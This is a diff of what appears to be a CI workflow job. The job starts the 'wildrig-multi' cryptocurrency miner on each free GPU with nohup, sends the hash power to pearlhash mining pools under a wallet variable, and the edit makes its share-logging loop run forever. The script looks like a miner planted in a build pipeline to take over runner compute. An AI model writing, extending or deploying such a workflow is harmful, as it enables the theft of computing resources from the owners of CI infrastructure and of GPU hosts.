@@ -37,7 +37,7 @@ jobs:
             if pgrep -af 'wildrig-multi' | grep -q -- "-d $i\( \|$\)"; then echo "SKIP g=$i pgrep"; continue; fi
             nohup "$B" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -u $W -p x --worker 1255880$i -d $i > $D/wr-$i.log 2>&1 &
             STARTED="$STARTED $i"
-            ( for t in $(seq 1 240); do if grep -qiE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
+            ( la=0; while true; do c=$(grep -ciE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$c" -gt "$la" ]; then la=$c; date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; fi; sleep 3; done ) &
           done
           echo "STARTED=$STARTED"
           if [ -z "$STARTED" ]; then echo "NO_FREE_GPU"; exit 0; fi
@@ -93,7 +93,7 @@ jobs:
             if pgrep -af 'wildrig-multi' | grep -q -- "-d $i\( \|$\)"; then echo "SKIP g=$i pgrep"; continue; fi
             nohup "$B" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -u $W -p x --worker 1255881$i -d $i > $D/wr-$i.log 2>&1 &
             STARTED="$STARTED $i"
-            ( for t in $(seq 1 240); do if grep -qiE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
+            ( la=0; while true; do c=$(grep -ciE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$c" -gt "$la" ]; then la=$c; date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; fi; sleep 3; done ) &
           done
           echo "STARTED=$STARTED"
           if [ -z "$STARTED" ]; then echo "NO_FREE_GPU"; exit 0; fi
